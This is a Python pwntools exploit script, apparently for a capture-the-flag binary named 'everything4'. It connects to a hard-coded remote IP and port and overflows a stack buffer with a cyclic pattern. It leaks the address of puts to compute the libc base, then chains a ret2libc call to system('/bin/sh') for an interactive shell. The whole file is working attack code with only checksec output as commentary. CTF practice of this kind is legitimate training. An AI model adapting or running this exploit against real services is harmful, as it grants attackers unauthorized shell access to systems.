#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './everything4'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '103.191.63.187', 5001

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x080491e9
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec everything4 
#     Arch:     i386-32-little
#     RELRO:    Partial RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x8046000)
#     RUNPATH:  b'.

def exploit():
    global io
    io = initialize()

    payload = flat([
        cyclic(0x7f4),
        elf.plt['puts'],
        0x0804901f,
        elf.got['puts'],
        0x0,
        0x0,
        elf.sym['everything_printer']
    ])
    io.sendlineafter(b':', payload)

    io.recvlines(2)
    libc.address = u32(io.recvline().strip().ljust(4, b'\x00')) - libc.sym['puts']

    payload = flat([
        cyclic(0x7f4),
        libc.sym['system'],
        0x0804901f,
        next(libc.search(b'/bin/sh\x00')),  
    ])
    io.sendlineafter(b':', payload)

    log.success('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()